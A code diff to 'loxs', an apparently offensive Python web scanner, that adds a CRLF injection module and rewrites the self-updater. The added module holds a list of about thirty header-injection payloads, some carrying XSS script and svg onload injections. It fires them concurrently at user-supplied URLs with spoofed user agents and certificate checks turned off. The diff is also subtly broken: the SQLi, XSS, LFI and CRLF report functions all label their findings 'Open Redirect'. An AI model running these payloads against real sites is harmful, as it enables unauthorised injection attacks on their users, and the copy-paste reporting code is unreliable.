@@ -1,5 +1,7 @@
 #!/usr/bin/python3
 
+VERSION = 'v1'
+
 class Color:
     BLUE = '\033[94m'
     GREEN = '\033[1;92m'
@@ -63,6 +65,11 @@ try:
     from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException
     import signal
     from functools import partial
+    from packaging import version
+    from rich.console import Console
+    from rich.panel import Panel
+    from rich.progress import Progress
+    from rich.text import Text
 
     USER_AGENTS = [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
@@ -108,12 +115,13 @@ try:
             "2] OR Scanner",
             "3] SQLi Scanner",
             "4] XSS Scanner",
-            "5] tool Update",
-            "6] Exit"
+            "5] CRLF Scanner",
+            "6] tool Update",
+            "7] Exit"
         ]
         
         for option in options:
-            print(border_color + "│" + option_color + option.ljust(59) + border_color + "│")
+            print(border_color + "│" + option_color + option.ljust(61) + border_color + "│")
         
         print(border_color + "└" + "─" * 61 + "┘")
         authors = "Created by: Coffinxp, 1hehaq, HexSh1dow, Naho, AnonKryptiQuz"
@@ -671,23 +679,26 @@ try:
                 os._exit(0)
 
         def save_results(vulnerable_urls, total_found, total_scanned, start_time):
-            html_content = generate_html_report(
-            "Structured Query Language Injection (SQLi)", 
-            total_found, 
-            total_scanned, 
-            int(time.time() - start_time), 
-            vulnerable_urls
-            )
-    
+            if total_scanned > 0:
 
-            timestamp = int(time.time())
-            filename = f"sqli_report_{timestamp}.html"
-            print(Fore.YELLOW + f"[i] Saving report as '{filename}'.")
+                html_content = generate_html_report(
+                    "Open Redirect (OR)", 
+                    total_found, 
+                    total_scanned, 
+                    int(time.time() - start_time), 
+                    vulnerable_urls
+                )
 
-            report_file = save_html_report(html_content, filename)
-            print(Fore.GREEN + f"[+] Report saved as '{filename}'.")
+                timestamp = int(time.time())
+                filename = f"or_report_{timestamp}.html"
+                print(Fore.YELLOW + f"[i] Saving report as '{filename}'.")
 
 
+                report_file = save_html_report(html_content, filename)
+                print(Fore.GREEN + f"[+] Report saved as '{filename}'.")
+            else:
+                print(Fore.RED + "[!] No URLs were scanned, skipping report generation.")
+                
         def prompt_for_urls():
             while True:
                 try:
@@ -706,7 +717,7 @@ try:
                             print(f"{Fore.RED}[!] You must provide either a file with URLs or a single URL.")
                             input(f"{Fore.YELLOW}\n[i] Press Enter to try again...")
                             clear_screen()
-                            print(f"{Fore.GREEN}Welcome to the Loxs SQL-Injector! - Coffinxp - 1hehaq- HexSh1dow - AnonKryptiQuz - Naho\n")
+                            print(f"{Fore.GREEN}Welcome to the Loxs SQL-Injector! - Coffinxp - 1hehaq - HexSh1dow - AnonKryptiQuz - Naho\n")
                 except Exception as e:
                     print(f"{Fore.RED}[!] Error reading input file: {url_input}. Exception: {str(e)}")
                     input(f"{Fore.YELLOW}[i] Press Enter to try again...")
@@ -1033,23 +1044,25 @@ try:
                 print(Fore.YELLOW + line)
 
         def save_results(vulnerable_urls, total_found, total_scanned, start_time):
-            html_content = generate_html_report(
-            "Cross-Site Scripting (XSS)", 
-            total_found, 
-            total_scanned, 
-            int(time.time() - start_time), 
-            vulnerable_urls
-        )
-        
+            if total_scanned > 0:
 
-            timestamp = int(time.time())
-            filename = f"xss_report_{timestamp}.html"
-            print(Fore.YELLOW + f"[i] Saving report as '{filename}'.")
+                html_content = generate_html_report(
+                    "Open Redirect (OR)", 
+                    total_found, 
+                    total_scanned, 
+                    int(time.time() - start_time), 
+                    vulnerable_urls
+                )
+
+                timestamp = int(time.time())
+                filename = f"or_report_{timestamp}.html"
+                print(Fore.YELLOW + f"[i] Saving report as '{filename}'.")
 
 
-            report_file = save_html_report(html_content, filename)
-            print(Fore.GREEN + f"[+] Report saved as '{filename}'.")
-
+                report_file = save_html_report(html_content, filename)
+                print(Fore.GREEN + f"[+] Report saved as '{filename}'.")
+            else:
+                print(Fore.RED + "[!] No URLs were scanned, skipping report generation.")
 
         def clear_screen():
             os.system('cls' if os.name == 'nt' else 'clear')
@@ -1337,7 +1350,7 @@ try:
    ____  ___    ____________   _  ___  __________
   / __ \/ _ \  / __/ ___/ _ | / |/ / |/ / __/ _  |
  / /_/ / , _/ _\ \/ /__/ __ |/    /    / _// , _/
-/____/_/|_| /___/\___/_/ |_/_/|_/_/|_/___/_/|_| 
+/____//_/|_| /___/\___/_/ |_/_/|_/_/|_/___/_/|_| 
         
                         """,
             style="bold green",
@@ -1495,23 +1508,26 @@ try:
             return found_vulnerabilities, vulnerable_urls
 
         def save_results(vulnerable_urls, total_found, total_scanned, start_time):
-            html_content = generate_html_report(
-                "Local File Inclusion (LFI)", 
-                total_found, 
-                total_scanned, 
-                int(time.time() - start_time), 
-                vulnerable_urls
-            )
+            if total_scanned > 0:
+
+                html_content = generate_html_report(
+                    "Open Redirect (OR)", 
+                    total_found, 
+                    total_scanned, 
+                    int(time.time() - start_time), 
+                    vulnerable_urls
+                )
+
+                timestamp = int(time.time())
+                filename = f"or_report_{timestamp}.html"
+                print(Fore.YELLOW + f"[i] Saving report as '{filename}'.")
 
 
-            timestamp = int(time.time())
-            filename = f"lfi_report_{timestamp}.html"
-            print(Fore.YELLOW + f"[i] Saving report as '{filename}'.")
-
-
-            report_file = save_html_report(html_content, filename)
-            print(Fore.GREEN + f"[+] Report saved as '{filename}'.")
-
+                report_file = save_html_report(html_content, filename)
+                print(Fore.GREEN + f"[+] Report saved as '{filename}'.")
+            else:
+                print(Fore.RED + "[!] No URLs were scanned, skipping report generation.")
+                
         def prompt_for_urls():
             while True:
                 try:
@@ -1662,83 +1678,408 @@ try:
         print(Fore.CYAN + f"\n[i] Total URLs scanned: {scan_state['total_scanned']}")
 
         os._exit(0)
+        
+    def run_crlf_scanner(scan_state=None):
+        import re
+        import urllib.parse
+        import requests
+        import urllib3
+        from requests.adapters import HTTPAdapter
+        from urllib3.util.retry import Retry
+        from prompt_toolkit import prompt
+        from prompt_toolkit.completion import PathCompleter
+        from urllib.parse import urlparse
+        init(autoreset=True)
 
-    def run_update():
+        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-        def load_config():
-            config_path = "config.yml"
-            if not os.path.isfile(config_path):
-                print(Color.YELLOW + "[!] Configuration file not found.")
-                os._exit(0)
+        def get_domain(url):
+            parsed_url = urlparse(url)
+            return parsed_url.netloc
 
-            with open(config_path, "r") as file:
+        def generate_payloads(url):
+            domain = get_domain(url)
+            base_payloads = [
+                "/%%0a0aSet-Cookie:loxs=injected",
+                "/%0aSet-Cookie:loxs=injected;",
+                "/%0aSet-Cookie:loxs=injected",
+                "/%0d%0aLocation: http://loxs.pages.dev",
+                "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23",
+                "/%0d%0a%0d%0a<script>alert('LOXS')</script>;",
+                "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e",
+                "/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('LOXS');</script>",
+                "/%0d%0aHost: {{Hostname}}%0d%0aCookie: loxs=injected%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: loxs=injected%0d%0a%0d%0a",
+                "/%0d%0aLocation: loxs.pages.dev",
+                "/%0d%0aSet-Cookie:loxs=injected;",
+                "/%0aSet-Cookie:loxs=injected",
+                "/%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<svg/onload=alert(document.domain)>",
+                "/%23%0aSet-Cookie:loxs=injected",
+                "/%25%30%61Set-Cookie:loxs=injected",
+                "/%2e%2e%2f%0d%0aSet-Cookie:loxs=injected",
+                "/%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a<script>alert(document.cookie)</script>%2F../%2F..%2F..%2F..%2F../tr",
+                "/%3f%0d%0aLocation:%0d%0aloxs-x:loxs-x%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.domain)</script>",
+                "/%5Cr%20Set-Cookie:loxs=injected;",
+                "/%5Cr%5Cn%20Set-Cookie:loxs=injected;",
+                "/%5Cr%5Cn%5CtSet-Cookie:loxs%5Cr%5CtSet-Cookie:loxs=injected;",
+                "/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:loxs=injected;",
+                "/%E5%98%8A%E5%98%8DLocation:loxs.pages.dev",
+                "/%E5%98%8D%E5%98%8ALocation:loxs.pages.dev",
+                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
+                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected;",
+                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
+                "/%u000ASet-Cookie:loxs=injected;",
+                "/loxs.pages.dev/%2E%2E%2F%0D%0Aloxs-x:loxs-x",
+                "/loxs.pages.dev/%2F..%0D%0Aloxs-x:loxs-x"
+            ]
+            
+            return [payload.replace('{{Hostname}}', domain) for payload in base_payloads]
+
+        REGEX_PATTERNS = [
+            r'(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)loxs\.pages\.dev\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?loxs=injected(?:\s*?)(?:$|;)))',
+            r'(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)loxs\.pages\.dev\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?loxs=injected(?:\s*?)(?:$|;)|loxs-x))'
+        ]
+
+        def get_random_user_agent():
+            return random.choice(USER_AGENTS)
+
+        def get_retry_session(retries=3, backoff_factor=0.3, status_forcelist=(500, 502, 504)):
+            session = requests.Session()
+            retry = Retry(
+                total=retries,
+                read=retries,
+                connect=retries,
+                backoff_factor=backoff_factor,
+                status_forcelist=status_forcelist,
+            )
+            adapter = HTTPAdapter(max_retries=retry)
+            session.mount('http://', adapter)
+            session.mount('https://', adapter)
+            return session
+
+        def check_crlf_vulnerability(url, payload):
+            payloads = generate_payloads(url)
+            target_url = f"{url}{payload}"
+            start_time = time.time()
+            
+            headers = {
+                'User-Agent': get_random_user_agent(),
+                'Accept': '*/*',
+                'Accept-Encoding': 'gzip, deflate',
+                'Connection': 'close'
+            }
+
+            try:
+                session = get_retry_session()
+                response = session.get(target_url, headers=headers, allow_redirects=False, verify=False, timeout=10)
+                response_time = time.time() - start_time
+
+                is_vulnerable = False
+                vulnerability_details = []
+
+                for header, value in response.headers.items():
+                    if any(re.search(pattern, f"{header}: {value}", re.IGNORECASE) for pattern in REGEX_PATTERNS):
+                        is_vulnerable = True
+                        vulnerability_details.append(f"{Fore.WHITE}Header Injection: {Fore.LIGHTBLACK_EX}{header}: {value}")
+
+                if any(re.search(pattern, response.text, re.IGNORECASE) for pattern in REGEX_PATTERNS):
+                    is_vulnerable = True
+                    vulnerability_details.append(f"{Fore.WHITE}Body Injection: {Fore.LIGHTBLACK_EX}Detected CRLF in response body")
+
+                if response.status_code in [200, 201, 202, 204, 205, 206, 207, 301, 302, 307, 308]:
+                    if is_vulnerable:
+                        result = Fore.GREEN + f"[✓] {Fore.CYAN}Vulnerable: {Fore.GREEN} {target_url} {Fore.CYAN} - Response Time: {response_time:.2f} seconds"
+                        if vulnerability_details:
+                            result += "\n    {}↪ ".format(Fore.YELLOW) + "\n    {}↪ ".format(Fore.YELLOW).join(vulnerability_details)
+                    else:
+                        result = Fore.RED + f"[✗] {Fore.CYAN}Not Vulnerable: {Fore.RED} {target_url} {Fore.CYAN} - Response Time: {response_time:.2f} seconds"
+                else:
+                    result = Fore.RED + f"[✗] {Fore.CYAN}Not Vulnerable: {Fore.RED} {target_url} {Fore.CYAN} - Response Time: {response_time:.2f} seconds"
+
+                if scan_state:
+                    scan_state['total_scanned'] += 1
+                    if is_vulnerable:
+                        scan_state['vulnerability_found'] = True
+                        scan_state['vulnerable_urls'].append(target_url)
+                        scan_state['total_found'] += 1
+
+                return result, is_vulnerable
+
+            except requests.exceptions.RequestException as e:
+                print(Fore.RED + f"[!] Error accessing {target_url}: {str(e)}")
+                return None, False
+
+        def test_crlf(url, max_threads=5):
+            found_vulnerabilities = 0
+            vulnerable_urls = []
+            payloads = generate_payloads(url)
+
+            with ThreadPoolExecutor(max_workers=max_threads) as executor:
+                future_to_payload = {executor.submit(check_crlf_vulnerability, url, payload): payload for payload in payloads}
+                for future in as_completed(future_to_payload):
+                    payload = future_to_payload[future]
+                    try:
+                        result, is_vulnerable = future.result()
+                        if result:
+                            print(Fore.YELLOW + f"[→] Scanning with payload: {payload}")
+                            print(result)
+                            if is_vulnerable:
+                                found_vulnerabilities += 1
+                                vulnerable_urls.append(url + payload)
+                    except Exception as e:
+                        print(Fore.RED + f"[!] Exception occurred for payload {payload}: {str(e)}")
+            return found_vulnerabilities, vulnerable_urls
+
+        def print_scan_summary(total_found, total_scanned, start_time):
+            summary = [
+                "→ Scanning finished.",
+                f"• Total found: {Fore.GREEN}{total_found}{Fore.YELLOW}",
+                f"• Total scanned: {total_scanned}",
+                f"• Time taken: {int(time.time() - start_time)} seconds"
+            ]
+            max_length = max(len(line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')) for line in summary)
+            border = "┌" + "─" * (max_length + 2) + "┐"
+            bottom_border = "└" + "─" * (max_length + 2) + "┘"
+            
+            print(Fore.YELLOW + f"\n{border}")
+            for line in summary:
+                padded_line = line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')
+                padding = max_length - len(padded_line)
+                print(Fore.YELLOW + f"│ {line}{' ' * padding} │{Fore.YELLOW}")
+            print(Fore.YELLOW + bottom_border)
+
+        def save_results(vulnerable_urls, total_found, total_scanned, start_time):
+            if total_scanned > 0:
+
+                html_content = generate_html_report(
+                    "Open Redirect (OR)", 
+                    total_found, 
+                    total_scanned, 
+                    int(time.time() - start_time), 
+                    vulnerable_urls
+                )
+
+                timestamp = int(time.time())
+                filename = f"or_report_{timestamp}.html"
+                print(Fore.YELLOW + f"[i] Saving report as '{filename}'.")
+
+
+                report_file = save_html_report(html_content, filename)
+                print(Fore.GREEN + f"[+] Report saved as '{filename}'.")
+            else:
+                print(Fore.RED + "[!] No URLs were scanned, skipping report generation.")
+
+        def get_file_path(prompt_text):
+            return prompt(prompt_text, completer=PathCompleter())
+
+        def prompt_for_urls():
+            while True:
                 try:
-                    config = yaml.safe_load(file)
+                    url_input = get_file_path("[?] Enter the path to the input file containing the URLs (or press Enter to input a single URL): ")
+                    if url_input:
+                        if not os.path.isfile(url_input):
+                            raise FileNotFoundError(f"File not found: {url_input}")
+                        with open(url_input) as file:
+                            urls = [line.strip() for line in file if line.strip()]
+                        return urls
+                    else:
+                        single_url = input(f"{Fore.CYAN}[?] Enter a single URL to scan: ").strip()
+                        if single_url:
+                            return [single_url]
+                        else:
+                            print(f"{Fore.RED}[!] You must provide either a file with URLs or a single URL.")
+                            input(f"{Fore.YELLOW}\n[i] Press Enter to try again...")
+                            clear_screen()
+                            print(f"{Fore.GREEN}Welcome to the CRLF Injection Testing Tool!\n")
                 except Exception as e:
-                    print(Color.YELLOW + f"[!] Error loading configuration file: {e}")
-                    os._exit(0)
+                    print(f"{Fore.RED}[!] Error reading input file: {url_input}. Exception: {str(e)}")
+                    input(f"{Fore.YELLOW}[i] Press Enter to try again...")
+                    clear_screen()
+                    print(f"{Fore.GREEN}Welcome to the CRLF Injection Testing Tool!\n")
+        
+        clear_screen()
+        panel = Panel(
+        r"""
+   __________  __    ______
+  / ____/ __ \/ /   / ____/  ______________ _____  ____  ___  _____
+ / /   / /_/ / /   / /_     / ___/ ___/ __ `/ __ \/ __ \/ _ \/ ___/
+/ /___/ _, _/ /___/ __/    (__  ) /__/ /_/ / / / / / / /  __/ /
+\____/_/ |_/_____/_/      /____/\___/\__,_/_/ /_/_/ /_/\___/_/
 
-            global appIdentifier, appRepo, appDir, appExecName
+        """,
+        style="bold green",
+        border_style="blue",
+        expand=False
+        )
+        rich_print(panel, "\n")
+
+        print(Fore.GREEN + "Welcome to the CRLF Injection Testing Tool!\n")
+
+        urls = prompt_for_urls()
+        
+        max_threads_input = input("[?] Enter the number of concurrent threads (1-50, press Enter for 5): ").strip()
+        max_threads = int(max_threads_input) if max_threads_input.isdigit() and 1 <= int(max_threads_input) <= 50 else 5
+
+        print(Fore.YELLOW + "\n[i] Loading, Please Wait...")
+        time.sleep(1)
+        clear_screen()
+        print(Fore.CYAN + "[i] Starting scan...\n")
+
+        total_found = 0
+        total_scanned = 0
+        start_time = time.time()
+        vulnerable_urls = []
+
+        if scan_state is None:
+            scan_state = {
+                'vulnerability_found': False,
+                'vulnerable_urls': [],
+                'total_found': 0,
+                'total_scanned': 0
+            }
+
+        for url in urls:
+            box_content = f" → Scanning URL: {url} "
+            box_width = max(len(box_content) + 2, 40)
+            print(Fore.YELLOW + "\n┌" + "─" * (box_width - 2) + "┐")
+            print(Fore.YELLOW + f"│{box_content.center(box_width - 2)}│")
+            print(Fore.YELLOW + "└" + "─" * (box_width - 2) + "┘\n")
+
+            found, urls_with_payloads = test_crlf(url, max_threads)
+            total_found += found
+            total_scanned += len(generate_payloads(url))
+            vulnerable_urls.extend(urls_with_payloads)
+
+        print_scan_summary(total_found, total_scanned, start_time)
+        save_results(vulnerable_urls, total_found, total_scanned, start_time)
+
+        print(Fore.RED + "\nExiting...")
+        os._exit(0)
+        
+        
+    
+    def run_update():
+        from packaging import version
+        import requests
+        from rich.console import Console
+        from rich.panel import Panel
+        from rich.progress import Progress
+        
+        console = Console()
+        def display_update_intro():
+            panel = Panel(
+                r"""
+ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░▒▓████████▓▒░▒▓████████▓▒░
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░
+░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░ ░▒▓█▓▒░   ░▒▓██████▓▒░
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░
+ ░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓████████▓▒░
+        """,
+                title="LOXS UPDATER",
+                expand=False,
+                border_style="blue",
+                style="bold green",
+            )
+            console.print(panel)
+            console.print("[cyan] Welcome to the loxs updater![/cyan]\n")
+
+        def get_latest_release(repo_owner, repo_name):
+            url = f"https://api.github.com/repos/{repo_owner}/{repo_name}/releases/latest"
             try:
-                appIdentifier = config['app']['identifier']
-                appRepo = config['app']['repository']
-                appDir = config['app']['directory']
-                appExecName = config['app']['executable']
-            except KeyError as e:
-                print(Color.YELLOW + f"[!] Missing key in configuration file: {e}")
-                os._exit(0)
+                response = requests.get(url)
+                response.raise_for_status()
+                release_data = response.json()
+                return release_data['tag_name'], release_data
+            except requests.exceptions.RequestException as e:
+                console.print(f"[red][!] Error fetching release information: {e}[/red]")
+                return None, None
 
-            if not os.path.isdir(appDir):
-                print(Color.YELLOW + f"[!] The directory specified in config.yml does not exist: {appDir}")
-                os._exit(0)
-
-        def get_remote_version(repo_url):
+        def get_current_version():
             try:
-                repo = Repo.clone_from(repo_url, 'temp_repo', depth=1)
-                latest_commit = repo.head.commit
-                shutil.rmtree('temp_repo')
-                return latest_commit.hexsha
-            except Exception as e:
-                print(Color.YELLOW + f"[!] Error accessing remote repository: {e}")
-                os._exit(0)
-
-        def get_local_version(file_path):
-            if os.path.isfile(file_path):
-                return os.popen(f"git log -1 --format=%H {file_path}").read().strip()
+                with open(__file__, 'r') as file:
+                    for line in file:
+                        if line.startswith('VERSION ='):
+                            return line.split('=')[1].strip().strip("'\"")
+            except IOError as e:
+                console.print(f"[red][!] Error reading current version: {e}[/red]")
             return None
 
-        def update_file():
+        def download_update(download_url, file_path):
             try:
-                print(Color.GREEN + "[i] Updating file...")
-                temp_repo_dir = 'temp_repo'
-                if os.path.isdir(temp_repo_dir):
-                    shutil.rmtree(temp_repo_dir)
-                Repo.clone_from(appRepo, temp_repo_dir)
-                source_file = os.path.join(temp_repo_dir, appExecName)
-                if os.path.isfile(source_file):
-                    shutil.copy(source_file, appDir)
-                    print(Color.GREEN + "[i] Update completed.")
-                    clear_screen()
-                else:
-                    print(Color.YELLOW + "[!] File to update not found in the repository.")
-                shutil.rmtree(temp_repo_dir) 
-            except Exception as e:
-                print(Color.RED + f"[!] Error during update: {e}")
-                os._exit(0)
+                with Progress() as progress:
+                    task = progress.add_task("[cyan]Downloading update...", total=100)
+                    response = requests.get(download_url, stream=True)
+                    response.raise_for_status()
+                    total_size = int(response.headers.get('content-length', 0))
+                    block_size = 1024
+                    with open(file_path, 'wb') as file:
+                        for data in response.iter_content(block_size):
+                            size = file.write(data)
+                            progress.update(task, advance=(size/total_size)*100)
+                console.print("[green][✓] Update downloaded successfully.[/green]")
+                return True
+            except requests.exceptions.RequestException as e:
+                console.print(f"[red][!] Error downloading update: {e}[/red]")
+                return False
 
-        def run():
-            load_config()
-            local_version = get_local_version(os.path.join(appDir, appExecName))
-            remote_version = get_remote_version(appRepo)
+        def normalize_version(v):
+            # Remove 'v' prefix if present
+            # v = v.lstrip('v')
 
-            if local_version != remote_version:
-                print(Color.GREEN + "[i] An update is available.")
-                update_file()
+            # Three components (major.minor.patch)
+            parts = v.split('.')
+            while len(parts) < 3:
+                parts.append('0')
+            return '.'.join(parts)
+
+        display_update_intro()
+
+        repo_owner = "coffinxp"
+        repo_name = "loxs"
+        current_version = get_current_version()
+
+        if current_version is None:
+            console.print("[yellow][!] Unable to find current version.[/yellow]")
+            input("\nPress Enter to return to the main menu...")
+            return
+
+        console.print(f"[cyan][i] Current version: {current_version}[/cyan]")
+        console.print("[cyan][i] Checking for updates...[/cyan]")
+
+        latest_version, release_data = get_latest_release(repo_owner, repo_name)
+
+        if latest_version is None:
+            console.print("[yellow][!] Unable to check for updates.[/yellow]")
+            input("\nPress Enter to return to the main menu...")
+            return
+
+        current_v = version.parse(normalize_version(current_version))
+        latest_v = version.parse(normalize_version(latest_version))
+
+        if latest_v > current_v:
+            console.print(f"[green][✓] New version available: {latest_version}[/green]")
+            update_choice = console.input("[cyan][?] Do you want to update? (y/n): [/cyan]").lower().strip()
+            
+            if update_choice == 'y':
+                try:
+                    download_url = release_data['assets'][0]['browser_download_url']
+                    
+                    if download_update(download_url, __file__):
+                        console.print("[green][✓] Update completed. Please restart loxs..!![/green]")
+                    else:
+                        console.print("[red][!] Update failed.[/red]")
+                except (KeyError, IndexError) as e:
+                    console.print(f"[red][!] Error fetching release assets: {e}[/red]")
             else:
-                print(Color.YELLOW + "[i] No update is needed.")
+                console.print("[yellow][i] Update cancelled.[/yellow]")
+        else:
+            console.print("[green][✓] You are already using the latest version.[/green]")
+            console.print(f"[cyan][i] Current version: {current_version}[/cyan]")
+            console.print(f"[cyan][i] Latest version: {latest_version}[/cyan]")
 
-        if __name__ == "__main__":
-            run()
+        input("\nPress Enter to return to the main menu...")
 
 
     def handle_selection(selection):
@@ -1760,9 +2101,14 @@ try:
 
         elif selection == '5':
             clear_screen()
-            run_update()
+            run_crlf_scanner()
 
         elif selection == '6':
+            clear_screen()
+            run_update()
+            clear_screen()
+
+        elif selection == '7':
             clear_screen()
             print_exit_menu()
 
@@ -1778,7 +2124,7 @@ try:
         while True:
             try:
                 display_menu()
-                choice = input(f"\n{Fore.CYAN}[?] Select an option (0-6): {Style.RESET_ALL}").strip()
+                choice = input(f"\n{Fore.CYAN}[?] Select an option (0-7): {Style.RESET_ALL}").strip()
                 handle_selection(choice)
             except KeyboardInterrupt:
                 print_exit_menu()
